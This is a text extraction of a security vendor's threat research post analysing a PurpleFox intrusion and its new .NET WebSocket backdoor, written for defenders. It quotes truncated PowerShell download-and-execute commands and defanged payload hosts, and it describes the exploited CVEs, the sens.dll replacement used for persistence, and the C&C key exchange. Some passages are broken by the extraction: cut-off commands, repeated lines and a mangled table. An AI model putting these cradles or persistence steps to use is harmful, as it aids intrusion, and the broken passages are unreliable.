10/20/21, 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsPurpleFox Adds New Backdoor That Uses WebSocketstrendmicro.com/en_us/research/21/j/purplefox-adds-new-backdoor-that-uses-websockets.htmlOctober 19, 2021In September 2021, the Trend Micro Managed XDR (MDR) team looked into suspicious activity related to a PurpleFox operator. Our findings led us to investigate an updated PurpleFox arsenal, which included an added vulnerability (CVE-2021-1732) and optimized rootkit capabilities leveraged in their attacks.We also found a new backdoor written in .NET implanted during the intrusion, which we believe is highly associated with PurpleFox. This backdoor, which we call FoxSocket, leverages WebSockets to communicate with its command-and-control (C&C) servers, resulting in a more robust and secure means of communication compared to regular HTTP traffic.We believe that this particular threat is currently being aimed at users in the Middle East. We first encountered this threat via customers in the region. We are currently investigating if it has been found in other parts of the world.In this blog, we describe some of the observed modifications for the initial PurpleFox payloads, alongside the new implanted .NET backdoor and the C2 infrastructure serving its functionality.PurpleFox Capabilities and Technical AnalysisPowerShellThe activity starts with either of the following PowerShell commands being executed:"cmd.exe" /c powershell -nop -exec bypass -c "IEX (New-Object "cmd.exe" /c powershell -nop -exec bypass -c "IEX (New-Object on multiple compromised servers. These servers are part of the PurpleFox botnet, with most of these located in China:CountryServer countChinaIndiaBrazilUnited States345342926url 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsOthers113Table 1. Location of PurpleFoxserversThe fetched payload is a long script consisting of three components:The script targets 64-bit architecture systems. It starts by checking the Windows version and applied hotfixes for the vulnerabilities it is targeting.Windows 7/Windows Server 2008CVE-2020-1054 (KB4556836, KB4556843) CVE-2019-0808 (KB4489878, KB4489885, KB2882822)Windows 8/Windows Server 2012CVE-2019-1458 (KB4530702, KB4530730)Windows 10/Windows Server 2019CVE-2021-1732 (KB4601354, KB4601345, KB4601315, KB4601319)After selecting the appropriate vulnerability, it uses the PowerSploit module to reflectively load the embedded exploit bundle binary with the target vulnerability and an MSI command as arguments. As a failover, it uses the Tater module to launch the MSI command.The goal is to install the MSI package as an admin without any user interaction.MSI PackageThe MSI package starts by removing the following registry keys, which are old Purple Fox installations if any are present:HKLM\SYSTEM\CurrentControlSet\Services\{ac00-ac10}It then installs the components (dbcode21mk.log and setupact64.log) of the Purple Fox backdoor to Windows directory. Afterward, it sets two registry values under the key “HKLM\SYSTEM\CurrentControlSet\Control\Session Manager”:AllowProtectedRenames to 0x1, and PendingFileRenameOperations to the following:\??\C:\Windows\AppPatch\Acpsens.dll \??\C:\Windows\system32\sens.dll \??\C:\Windows\AppPatch\Acpsens.dll \??\C:\Windows\system32\sens.dll \??\C:\Windows\setupact64.log \??\C:\Windows\system32\sens.dllurl 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsThese commands move sens.dll to C:\Windows\AppPatch\Acpsens.dll and replace it with the installed file setupact64.log.The MSI package then runs a .vbs script that creates a Windows firewall rule to block incoming connections on ports 135, 139, and 445. As a final step, the system is restarted to allow PendingFileRenameOperations to take place, replacing sens.dll, which will make the malware run as the System Event Notification Service (SENS).PurpleFox BackdoorThe installed malware is a .dll file protected with VMProtect. Using the other data file installed by the MSI package, it unpacks and manually loads different DLLs for its functionality. It also has a rootkit driver that is also unpacked from the data file and is used to hide its files, registry keys, and processes. The sample starts by copying itself to another file and installing a new service, then restoring the original sens.dll file. Afterward, it loads the driver to hide its files and registries and then spawns and injects a sequence of a 32-bit process to inject its code modules into, as they are 32-bit DLLs.Figure 1. PurpleFox installation processWebSocket BackdoorInitial Deliveryurl 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsThe initial activity for retrieving this backdoor was captured three days after the previous PurpleFox intrusion attempts on the same compromised server. The Trend Micro Vision One™ platform flagged the following suspicious PowerShell commands:"cmd.exe" /c powershell -c "iex((new-object "cmd.exe" /c powershell -c "iex((new-object "cmd.exe" /c powershell -c "iex((new-object "cmd.exe" /c powershell -c "iex((new-object "cmd.exe" /c powershell -c "iex((new-object "cmd.exe" /c powershell -c "iex((new-object "cmd.exe" /c powershell -c "iex((new-object 185[.]112.144.245/a/[1-9], and all were found to be serving two variants of another PowerShell script that acts as the main downloader for the .NET backdoor.url 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsFigure 3. Contents of payloadThe difference between the two observed PowerShell scripts were in Base64-encoded data that was passed as an argument to the .NET sample downloaded from 185[.]112[.]144[.]45/a/data and finally invoked with this configuration parameter. We found two different configuration parameters used: We observed the first one on August 26 and the second one with more domains embedded on August 30. The decoded Base64-encoded configuration parameters are shown in the following figures:Figure 4. August 26 configurationFigure 5. August 30 configurationThese configuration parameters will be used by the .NET initialization routines to pick a C&C server and initialize cryptographic functions for the C&C channel. Aside from the configuration, the payload itself is retrieved from 185.112.144[.]45/a/data.We also found some old variants that date back to June 22 that have fewer capabilities than the more recent variants.url 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsDuring the earliest iterations for deploying this backdoor, aligning with the creation data of the malicious domain advb9fyxlf2v[.]com, the configuration parameters had a minimal number of subdomains to contact the C&C servers compared to the recent one NET Backdoor ObfuscationFigure 6. Backdoor configurationLet us start the analysis with the backdoor dropped on the SQL server. When decompiled, it will output some obfuscated symbols, although most of these can’t be restored to the original. Merely making them to be human-readable is sufficient for basic static analysis. Sometimes, some of the original names can be restored.One notable characteristic we rarely see in malware is leveraging WebSocket communication to the C&C servers for an efficient bidirectional channel between the infected client and the server.WebSocket is a communication technology that supports streams of data to be exchanged between a client and a server over just a single TCP session. This is different from traditional request or response protocols like HTTP. This gives the threat actor a more covert alternative to HTTP requests and responses traffic, which creates an opportunity for a more silent exfiltration with less likelihood of being detected.Figure 7. Cleaned classes and method namesurl 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsFigure 8. Traditional (left) and WebSocket techniques (right)It initializes a WebSocket communication with its C&C server and keeps it open by sending keepalive messages to maintain the TCP connection. Once this is established, a series of bidirectional messages will be exchanged between the infected machine and the selected C&C server to negotiate a session encryption key.Figure 9. TCP/IP exchanges between client and serverThe execution starts by initializing the WebSocket and registering four callback functions as handlers for the WebSocket events.url 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsFigure 10. Function for registering callback functionsOne of the relevant callbacks is onOpen, which will initialize the C&C channel encryption parameters once the WebSocket object is fired for the first time. As shown in the next section, this is mainly for implementing the first Diffie-Hellman (DH) key exchange message with the C&C server. On the other side, the onReceive handler will process and dispatch all the commands received from the server after a secure communication channel is established and when the session encryption key is updated.Key NegotiationsThe first key exchange with the C&C server is carried out by the onOpen callback registered function, as seen in Figure 11.Figure 11. onOpen functionIt initializes the EC DH object with some parameters to start the shared secret key negotiation. The ECDiffieHellmanKeyDerivationFunction property is then set to Hash. This property is for specifying the key derivation function that the ECDiffieHellmanCng class will use to convert secret agreements into key material, so a hash algorithm is used to generate key material (instead of HMAC or TLS).Afterward, the client will try to send the property PublicKey, which will be used at the C&C side on another ECDiffieHellmanCng object to generate a shared secret agreement. Eventually, this data will be sent on the WebSocket as the first key exchange message. However, instead of sending it in cleartext, the client deploys a symmetric AES encryption for any communication over the WebSocket for the first exchange, as no shared secret is established yet, and the AES encryption will generate a default key for this first exchange.url 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsFigures 12-13. Function and code for the AES encryption keyThis will result in the key negotiation message being encrypted with AES using the shown parameters and a dummy key generated (111….11)[32] named byte_0 in the following debugging session with the actual AES cipher text with a fixed length of 176 bytes.Figure 14. Structure of key exchange messageThe 176 encrypted bytes are the actual data that will be sent over the WebSocket, which marks the end of the first key exchange message.Second Exchange (C&C to Victim)The second key exchange message is sent from the server to the client that will be handled by the onReceive function. The execution is invoked by the message handler.url 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsFigure 15. Invoking the onReceive functionThis AES-encrypted second exchange has a fixed length of 304 bytes.Figure 16. Contents of incoming messageIt then checks if this incoming message is related to the control plane key establishment or just a normal data command.If it is related to the former, the first step is to decrypt the symmetric encryption on the C2 channel then finalize the shared secret generation by handing the execution to ECDH derivation function method_7.Figure 17. Handoff to method_7 functionurl 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsThe client will verify the signed message by loading the RSA public key loaded from the configuration payload shown in the previous section. If the signature is verified correctly, key material will be derived from the DH exchange and will be saved as the permanent symmetric AES encryption key (Symmetric_AES_key variable) that will be used as long as the WebSocket channel is active.Third Exchange (Victim to C&C)Figure 18. method_7 functionOnce an efficient encrypted session is established over the WebSocket, the client will fingerprint the machine by extracting specific data (including the username, machine name, local IP, MAC address, and Windows version) and will relay such data over the secure channel to get the victim profiled at the server side, which is the final exchange before the WebSocket channel is fully established. It will then listen for further commands, which will be covered in the next section.As the fingerprinting data collected will be different from one execution environment to another, this message will vary in length. From our lab analysis, it was 240 bytes with the newly generated shared secret key.Figure 19. Newly generated secret keyurl 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsAs far as the WebSocket is maintained with the keepalive messages shown earlier, the operators can signal any command to be executed, so what happens next mainly depends on the targeting and the actual motivation of the operator.WebSocket CommandsIn this section, we cover some of the observed commands sent from the server. There are some minor differences between variants across them with regard to the command numbers and the supported functionality.All the handling of commands is implemented in the main dispatch routine (except for clients. By profiling the infected targets and interacting through different commands sent, we listed the observed IP addresses and the registered domains found in the PowerShell ehf )Iraq, Saudi Arabia, Turkey, UAE(Hosting .Net Payload, connect via WebSockets. If it fails to connect on port 12345, it will try to resolve another subdomain.url 1:48 PMPurpleFox Adds New Backdoor That Uses WebSocketsFigure 20. Random C&C serversThe main domain advb9fyxlf2v[.]com used by these servers — registered on June 17, 2021, just within days of the first observed variant — is mainly for load balancing across the multiple active servers.ConclusionThe rootkit capabilities of PurpleFox make it more capable of carrying out its objectives in a stealthier manner. They allow PurpleFox to persist on affected systems as well as deliver further payloads to affected systems. We are still monitoring these new variants and their dropped payloads. The new .NET WebSocket backdoor (called FoxSocket, which we detect as Backdoor.MSIL.PURPLEFOX.AA) is being closely monitored to discover any more information about this threat actor’s intentions and objectives.Trend Micro Solutions and Indicators of CompromiseThe capabilities of the Trend Micro Vision One platform made both the detection of this attack and our investigation into it possible. We took into account metrics from the network and endpoints that would indicate potential attempts of exploitation. The Trend Micro Vision One Workbench shows a holistic view of the activities that are observed in a user’s environment by highlighting important attributes related to the attack.Trend Micro Managed XDR offers expert threat monitoring, correlation, and analysis from experienced cybersecurity industry veterans, providing 24/7 service that allows organizations to have one single source of detection, analysis, and response. This service is enhanced by solutions that combine AI and Trend Micro’s wealth of global threat intelligence.All IOCs related to this attack can be found in this separate file.url 